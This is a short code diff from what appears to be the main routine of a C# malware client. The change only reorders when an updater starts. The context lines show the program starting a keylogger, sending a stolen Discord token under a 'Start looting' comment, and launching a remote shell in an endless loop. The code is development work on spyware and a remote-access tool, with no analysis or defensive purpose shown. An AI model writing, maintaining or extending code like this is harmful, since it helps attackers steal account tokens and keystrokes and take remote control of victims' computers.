@@ -19,6 +19,7 @@ namespace Client
         static void Main(string[] args)
         {
             ArgsParser(args);
+
             CheckRealApplication();
 
             // make sure this thing wont crash
@@ -68,9 +69,6 @@ namespace Client
                 }
             }
 
-            /// Init update checkers.
-            Utilities.Updater Updater = new Utilities.Updater();
-            Updater.Start();
 
             /// Start loggers.
             Armitage.Watchers.Keylogger.Start();
@@ -83,6 +81,10 @@ namespace Client
             /// Start looting.
             Armitage.Cookies.Discord_Token.Send();
 #endif
+            /// Init update checkers.
+            Utilities.Updater Updater = new Utilities.Updater();
+            Updater.Start();
+
             /// Start remote shell
             Armitage.Shell.Shell.Start();
             while (true)
